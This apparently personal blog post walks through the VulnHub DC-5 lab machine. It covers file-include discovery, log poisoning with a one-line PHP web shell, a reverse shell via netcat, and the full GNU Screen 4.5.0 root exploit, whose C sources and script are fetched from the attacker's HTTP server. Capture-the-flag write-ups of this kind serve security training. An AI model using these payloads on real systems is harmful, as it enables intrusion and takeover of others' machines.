---
layout: "post"
title: "DC 5 Walkthrough"
categories: [vulnhub, DC-Series]
tags: [dc-5, medium, suid, lfi, log poisoning, screen]
---
DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv sec to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!

# Summary
- Portscan
- Fuzzing LFI parameter
- Reading files using LFI
- Web Shell via Log Poisoning
- Getting reverse shell
- Finding SUID
- Privilege Escalation by exploiting `screen-4.5.0`
- Root shell
- The Flag

# Portscan

```
Nmap scan report for 192.168.1.7
Host is up (0.00061s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Welcome
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35668/tcp   status
|   100024  1          52987/tcp6  status
|   100024  1          53084/udp6  status
|_  100024  1          57579/udp   status

```
# Website

When we browse the website with its IP address, it conatins some static pages.
![website](/assets/img/dc-5/mainpage.png)

## Gobuster
I use gobuster to findout files and directories.

```bash
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.7 -x php,html,txt -o go-main.out
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.7
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2020/08/30 19:26:34 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/contact.php (Status: 200)
/faq.php (Status: 200)
/solutions.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/about-us.php (Status: 200)
/thankyou.php (Status: 200)

```

# Finding LFI

After visiting these pages several times, I noticed that the `copyright year` in `thankyou.php` gets changed every time I refresh the page.
![t1](/assets/img/dc-5/2020.png)
![t2](/assets/img/dc-5/2017.png)
So I decided to `FUZZ` the website.

```bash
$wfuzz --hh 851 -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.7/thankyou.php?FUZZ=

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.7/thankyou.php?FUZZ=
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000010:   200        42 L     63 W     835 Ch      "file"         

Total time: 5.193434
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 498.3215
```
Here I found the `file` parameter and using it we can read files too.
![etc-passwd](/assets/img/dc-5/passwd.png)

# Web Shell via Log Poisoning
Log Poisoning is to put some php into the logs, and then load using lfi. We know that nginx server stored logs in /var/log/ngnix/error.log. The easy way would be to add php code in url it will get written in the log file and then access it with lfi.

## Inject the PHP code 
I inject the php code to get the command line access by making a GET request to the server.

```php
<?php system($_GET['cmd']) ?>
```

![phpinjection](/assets/img/dc-5/phpinjection.png)
## Getting reverse shell
To get code execution on site I added `cmd` parameter to URL.
It looks like this
>http://192.168.1.6/thankyou.php?file=/var/log/nginx/error.log&cmd=id


We can execute any system command on server using it. I execute reverse shell.

![reverse](/assets/img/dc-5/reverse.png)

```bash
┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.6] 58309
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dc-5:~/html$ ^Z
[1]+  Stopped                 nc -nvlp 4444
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]
└──╼ $stty raw -echo
┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]
└──╼ $nc -nvlp 4444

www-data@dc-5:~/html$ export TERM=xterm
```
# Privsec to Root

Looking at SUID files, `/bin/screen-4.5.0` seem suspicious to me.
```
www-data@dc-5:~/html$ find / -perm -4000 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```

Here is an exploit I found on searchsploit.
```bash
$searchsploit screen 4.5.0
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                        | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                  | linux/local/41152.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The exploit has 3 steps. Two compile and one is exploit.

The files are

### 1. libhax.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

### 2. rootshell.c

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

### 3. 41154.sh
```bash
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```
Run libhax.c and rootshell.c on local machine
```bash
$gcc -fPIC -shared -ldl -o libhax.so libhax.c
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
$gcc -o rootshell rootshell.c
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
```

Now we have total 5 files. For simplicity I compress them to tranfer to server.
```bash
$ls
41154.sh  libhax.c  libhax.so  rootshell  rootshell.c
$tar -zcvf exploit.tar.gz *
41154.sh
libhax.c
libhax.so
rootshell
rootshell.c
```
Tranfer `exploit.tar.gz` to server and decompress the files.
```
$python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.6 - - [31/Aug/2020 14:13:17] "GET /exploit.tar.gz HTTP/1.1" 200 -
```

```
www-data@dc-5:/tmp$ wget http://192.168.1.2:8000/exploit.tar.gz
converted 'http://192.168.1.2:8000/exploit.tar.gz' (ANSI_X3.4-1968) -> 'http://192.168.1.2:8000/exploit.tar.gz' (UTF-8)
--2020-08-31 18:43:15--  http://192.168.1.2:8000/exploit.tar.gz
Connecting to 192.168.1.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4430 (4.3K) [application/gzip]
Saving to: 'exploit.tar.gz'

exploit.tar.gz      100%[=====================>]   4.33K  --.-KB/s   in 0s     

2020-08-31 18:43:15 (474 MB/s) - 'exploit.tar.gz' saved [4430/4430]
www-data@dc-5:/tmp$ ls
exploit.tar.gz
www-data@dc-5:/tmp$ tar -zxvf exploit.tar.gz 
41154.sh
libhax.c
libhax.so
rootshell
rootshell.c
www-data@dc-5:/tmp$ ls
41154.sh  exploit.tar.gz  libhax.c  libhax.so  rootshell  rootshell.c
```

At last grant permission and execute the exploit.
```
www-data@dc-5:/tmp$ chmod +x 41154.sh 
www-data@dc-5:/tmp$ ./41154.sh 
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

# The Flag

```
# cat thisistheflag.txt


888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.

```
